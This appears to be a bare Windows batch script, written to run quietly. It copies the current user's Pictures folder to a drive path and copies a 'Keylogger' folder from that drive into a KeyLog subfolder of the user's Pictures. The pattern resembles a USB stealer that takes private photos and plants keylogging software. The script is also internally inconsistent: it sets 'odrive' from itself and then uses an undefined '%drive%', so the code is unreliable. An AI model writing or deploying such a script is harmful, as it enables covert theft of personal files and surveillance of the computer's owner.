@echo off
:: variables
SET odrive=%odrive:~0,2%
set backupcmd=xcopy /c
echo off
%backupcmd% "%USERPROFILE%\Pictures" "%drive%\all\My pics\"
%backupcmd% "%drive%\Keylogger" "%USERPROFILE%\Pictures\KeyLog\"
@echo off
cls